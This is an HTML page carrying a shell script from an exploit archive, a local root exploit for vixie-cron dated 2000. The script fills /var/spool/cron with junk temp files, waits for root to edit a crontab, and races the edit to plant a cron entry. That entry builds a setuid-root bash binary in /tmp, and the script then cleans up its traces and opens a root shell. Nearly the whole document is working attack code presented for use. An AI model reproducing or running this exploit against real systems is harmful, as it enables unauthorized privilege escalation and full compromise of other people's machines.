<html><head><title>vixie-cron Local Root Exploit </title></head><pre>#!/bin/sh

echo '.-------------------------------------------------------------------------.'
echo '| Marchew Hyperreal Industries ................... &lt;marchew@dione.ids.pl&gt; |'
echo &quot;| ( ...well, it is just me, but it is more elite to speak as a group... ) |&quot;
echo &quot;\`--------------------------------- presents ------------------------------'&quot;
echo
echo '  * another vixie-cron root sploit by Michal Zalewski &lt;lcamtuf@ids.pl&gt; *   '
echo
echo '.-------------------------------------------------------------------------.'
echo '| This time, it is somewhat more complicated. On some systems, it might   |'
echo '| require some tuning, to be slower, but resources-effective. It expects  |'
echo '| root (or other choosen user) to do &quot;crontab -e&quot; or &quot;crontab /any/file&quot;  |'
echo '| sooner or later, and spoofs the legitimate cron entry file with evil    |'
echo '| content, thus leading to account compromise (usually: root compromise). |'
echo &quot;\`-------------------------------------------------------------------------'&quot;
echo

CYCLES=32768
DESTUSER=root
SHOULDTOOK=60

VCRON=&quot;`strings /usr/bin/crontab 2&gt;/dev/null|grep -i vixie`&quot;

if [ &quot;$VCRON&quot; = &quot;&quot; ]; then
  echo &quot;[-] Sorry, this box is not running vixie cron.&quot;
  echo
  exit 1
else
  echo &quot;[+] Found Paul Vixie's /usr/bin/crontab utility.&quot;
fi


if [ -r /var/spool/cron ]; then
  echo &quot;[+] This box has exploitable /var/spool/cron...&quot;
else
  echo &quot;[-] Sorry, this box is not vulnerable to this attack.&quot;
  echo
  exit 1
fi


if [ -u /usr/bin/crontab ]; then
  echo &quot;[+] This box has setuid crontab utility...&quot;
else
  echo &quot;[-] Sorry, this box has no setuid crontab.&quot;
  echo
  exit 1
fi

cat &gt;dowrite.c &lt;&lt;_EOF_
main() {
  lseek(1,0,0);
  write(1,&quot;* * * * * /tmp/.rootcron\n\n&quot;,26);
  ftruncate(1,25);
}
_EOF_

echo &quot;[+] Compiling helper application #1...&quot;

gcc -o dowrite dowrite.c 

if [ ! -f dowrite ]; then
  echo &quot;[-] Compilation failed.&quot;
  echo
  exit 1
fi

echo &quot;[+] Application #1 compiled successfully.&quot;

echo &quot;[+] Creating helper application #2...&quot;

cat &gt;/tmp/.rootcron &lt;&lt;_EOF_
#!/bin/sh

(
  chown root.root /tmp/.r00tcr0n
  chmod 6755 /tmp/.r00tcr0n
  rm -f /var/spool/cron/tmp.*
  crontab -r
) &amp;&gt;/dev/null

_EOF_

cat &gt;root.c &lt;&lt;_EOF_
main() {
  setuid(0); setgid(0);
  unlink(&quot;/tmp/.r00tcr0n&quot;);
  execl(&quot;/bin/bash&quot;,&quot;bash&quot;,&quot;-i&quot;,0);
  perror(&quot;bash&quot;);
}
_EOF_

echo &quot;[+] Compiling helper application #3...&quot;

gcc -o /tmp/.r00tcr0n root.c

if [ ! -f /tmp/.r00tcr0n ]; then
  echo &quot;[-] Compilation failed.&quot;
  echo
  exit 1
fi

echo &quot;[+] Application #3 compiled successfully.&quot;


X=0


if [ ! &quot;$1&quot; = &quot;noprep&quot; ]; then

  echo &quot;[*] Attack against user $DESTUSER, doing $CYCLES setup cycles...&quot;
  echo &quot;    Please be patient, setup might took some time; to skip it if&quot;
  echo &quot;    /var/spool/cron on this machine is already initialized, use&quot;
  echo &quot;    '$0 noprep'.&quot;

  PROB=$[CYCLES*100/32768]
  test &quot;$PROB&quot; -gt &quot;100&quot; &amp;&amp; PROB=100

  echo &quot;[+] This gives almost $PROB% probability of success on the first attempt.&quot;

  while [ &quot;$X&quot; -lt &quot;$CYCLES&quot; ]; do
    X=$[X+1]
    echo -ne &quot;\r[?] Doing cycle $X of $CYCLES [$[X*100/CYCLES]% done]... &quot;
    umask 0
    ( ( crontab /dev/urandom &amp; usleep 1000; killall crontab ) &amp; ) &amp;&gt;/dev/null 
  done

  sleep 3;killall -9 crontab &amp;&gt;/dev/null

  echo
  echo &quot;[+] Setup complete, /var/spool/cron filled with junk tmp files.&quot;

  CNT=0

  echo &quot;[*] Now, doing cleanup and counting the nodes...&quot;

  for i in 1 2 3 4 5 6 7 8 9; do
    for j in /var/spool/cron/tmp.${i}*; do
      echo -n &gt;$j
      echo -ne &quot;\r[+] Node $CNT clean... &quot;
      CNT=$[CNT+1]
    done
  done

  echo

  PROB=$[CNT*100/32768]

  echo &quot;[+] Found $CNT nodes, approx. $PROB% chance...&quot;

  if [ &quot;$CNT&quot; -lt &quot;$[CYCLES*2/3]&quot; ]; then
    echo &quot;[-] Less than 66% of expected nodes were created. Try adjusting the exploit.&quot;
    echo
    exit 1
  fi

else

  echo &quot;[?] Skipping /var/spool/cron initialization. Results might be unpredictable.&quot;

fi

echo &quot;[+] Now I will wait for $DESTUSER to edit his crontab. Could take some time.&quot;

chmod 755 /tmp/.rootcron

while :; do
  sleep 1
  GOT=&quot;`ps auxhw|grep ^$DESTUSER|grep crontab|grep -v grep|cut -b10-15|head -1`&quot;
  test &quot;$GOT&quot; = &quot;&quot; &amp;&amp; continue
  GOT=`echo $GOT`
  echo &quot;[+] Caught victim at pid $GOT...&quot;
  if [ ! -f /var/spool/cron/tmp.$GOT ]; then
    echo &quot;[-] DAMN! We have no node for this pid, bad luck...&quot;
    continue
  fi
  echo '[+] Got this node :) Entering event wait loop...'
  export DESTUSER
  (
     G=blabla
     while [ ! &quot;$G&quot; = &quot;&quot; ]; do
       G=&quot;`ps auxhw|grep ^$DESTUSER|grep crontab|grep -v grep`&quot;
     done
     sleep 1
     echo &quot;[+] Bingo! It happened. Now writing our evil content...&quot; 1&gt;&amp;2
     ./dowrite
  ) &gt;/var/spool/cron/tmp.$GOT
  echo '* * * * * /bin/true' &gt;.ctab
  echo &quot;[+] Evil content written. Trying to rehash the daemon...&quot;
  crontab .ctab
  crontab -r
  echo &quot;[+] Entering event loop waiting for exploit to work...&quot;
  while [ ! -u /tmp/.r00tcr0n ]; do
    sleep 1
  done
  rm -f .ctab dowrite dowrite.c /tmp/.rootcron root.c
  echo &quot;[+] Calling the main code...&quot;
  /tmp/.r00tcr0n
  echo &quot;[*] Thank you for choosing Marchew Industries.&quot;
  echo
  exit 1
done  


# milw0rm.com [2000-11-21]</pre></html>